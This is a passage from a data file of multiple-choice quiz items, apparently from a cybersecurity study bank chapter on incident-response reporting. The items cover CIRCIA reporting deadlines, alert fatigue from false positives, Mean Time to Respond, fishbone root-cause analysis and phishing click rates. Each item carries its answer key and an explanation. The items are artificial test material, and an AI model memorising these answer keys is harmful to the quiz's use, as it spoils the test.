HR.","l":"c12-ir-report","l2":"","k":""},{"id":"lq:c12-ir-report:4","set":"lq","ch":12,"d":4,"q":"Under the Cyber Incident Reporting for Critical Infrastructure Act (CIRCIA), a covered defense industrial base entity that suffers a substantial cyber incident and chooses to pay an extortion demand must report the ransomware payment to CISA within what timeframe?","o":["4 business days","72 hours","60 calendar days","24 hours"],"a":3,"e":"Under CIRCIA, substantial cyber incidents must be reported to CISA within 72 hours, while ransomware payments must be reported within 24 hours of making the payment.","l":"c12-ir-report","l2":"","k":""},{"id":"lq:c12-ir-report:5","set":"lq","ch":12,"d":4,"q":"A SOC manager is evaluating quarterly security operations performance. Telemetry indicates that the SOC handled 15,000 alerts, but analysts were severely burned out and several true intrusions were overlooked. Which metric BEST identifies the root cause of this operational issue?","o":["A high false-positive rate","A low phishing campaign click rate","A low Mean Time to Detect","A high true-positive rate"],"a":0,"e":"A high false-positive rate generates massive alert noise, causing analyst alert fatigue. Fatigued analysts dismiss alerts prematurely, creating opportunities for genuine intrusions to slip through unnoticed.","l":"c12-ir-report","l2":"","k":""},{"id":"lq:c12-ir-report:6","set":"lq","ch":12,"d":4,"q":"An incident analyst is calculating the elapsed time from when an intrusion alert first fired in the SIEM to when the endpoint was successfully isolated from the corporate network using EDR network containment. Which metric is the analyst evaluating?","o":["Mean Time to Detect (MTTD)","Mean Time to Respond","Mean Time to Remediate","Mean Time to Close (MTTC)"],"a":1,"e":"Mean Time to Respond measures the time elapsed from detection of an incident to the execution of the first containment action (such as isolating an endpoint or blocking an IP).","l":"c12-ir-report","l2":"","k":""},{"id":"lq:c12-ir-report:7","set":"lq","ch":12,"d":4,"q":"During a post-incident lessons-learned meeting, the investigation reveals that an attacker accessed an internal server because a system administrator failed to apply multi-factor authentication, the firewall rules were overly permissive, and the organization lacked a written access policy. Which Root-Cause Analysis (RCA) tool is BEST suited to visualize and categorize these contributing factors?","o":["A linear CVSS base metric vector string","A MITRE ATT&CK Navigator technique heat map","An Ishikawa (fishbone) diagram categorizing people, processes, and technology","A Diamond Model event graph tracking capability and infrastructure"],"a":2,"e":"An Ishikawa (fishbone) diagram categorizes contributing factors across categories like People, Process, and Technology to identify underlying systemic root causes. MITRE ATT&CK and Diamond Models map adversary tactics and campaign infrastructure rather than organizational process failures, and CVSS evaluates technical software vulnerabilities.","l":"c12-ir-report","l2":"","k":""},{"id":"lq:c12-ir-report:8","set":"lq","ch":12,"d":4,"q":"A security awareness manager runs a monthly simulated phishing campaign. Out of 2,000 corporate emails delivered, 160 employees clicked the malicious link. What is the phishing campaign click rate?","o":["0.8%","12.5%","16.0%","8.0%"],"a":3,"e":"The click rate formula is <code>(Clicks / Delivered) * 100</code>. Calculating <code>(160 / 2,000) * 100 = 8.0%</code>.","l":"c12-ir-report","l2":"","k":""}];
